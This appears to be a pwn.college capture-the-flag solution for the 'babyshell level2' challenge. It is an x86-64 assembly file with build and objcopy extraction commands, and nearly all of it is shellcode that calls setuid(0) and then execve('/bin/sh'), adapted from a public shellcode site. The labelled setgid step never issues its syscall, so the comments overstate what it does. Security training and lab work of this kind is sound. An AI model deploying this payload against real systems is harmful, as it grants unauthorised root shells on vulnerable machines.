# babyshell level2 solution pwncollege
# randomized addresses, so put the string /bin/sh in rbx and not declared, i guess :p

# build with gcc -nostdlib -static shellbindsh.s -o shellcode-elf
# objdump -M intel -d shellcode-elf
# get shellcode with objcopy --dump-section .text=shellcode-raw shellcode-elf

.global _start
_start:
.intel_syntax noprefix
label1:
	# setuid(0)
	xor rdi,rdi
	mov al,0x69
	syscall
	# setgid(0)
	xor rdi,rdi
	mov al,0x6a
	# exec bin/sh
	xor eax, eax
	mov rbx, 0xFF978CD091969DD1 # http://shell-storm.org/shellcode/files/shellcode-806.php
	neg rbx
	push rbx
	push rsp
	pop rdi
	cdq
	push rdx
	push rdi
	push rsp
	pop rsi
	mov al, 0x3b
	syscall
